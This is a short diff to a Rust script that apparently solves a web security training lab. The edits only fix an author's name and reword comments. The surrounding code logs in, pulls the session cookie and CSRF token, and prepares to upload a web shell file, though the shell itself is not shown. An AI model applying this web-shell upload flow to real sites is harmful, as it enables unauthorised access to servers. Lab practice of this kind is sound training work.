@@ -1,6 +1,6 @@
 /***************************************************************************************
 *
-* Author: Ahmed Elqalawy (@elqal3awii)
+* Author: Ahmed Elqalaawy (@elqal3awii)
 *
 * Date: 13/10/2023
 *
@@ -66,7 +66,7 @@ fn main() {
     let mut session = extract_session_cookie(login_page.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // extract csrf token
+    // extract the csrf token
     let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
 
     println!("{}", "OK".green());
@@ -100,7 +100,7 @@ fn main() {
         .send()
         .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));
 
-    // extract csrf token
+    // extract the csrf token
     csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
 
     // the shell file to be uploaded
